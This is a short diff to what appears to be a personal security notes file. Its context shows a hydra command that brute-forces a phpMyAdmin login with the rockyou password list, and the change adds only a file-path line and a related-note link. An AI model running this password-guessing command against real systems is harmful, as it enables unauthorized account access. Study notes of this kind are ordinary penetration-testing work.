@@ -3,6 +3,8 @@
 hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f $IP http-get /phpmyadmin/ -t 15
 ```
 
+` zet/20221003150743/README.md `
+
 # Related
 
 - [20221003150744](/zet/20221003150744/README.md) hydra brute force
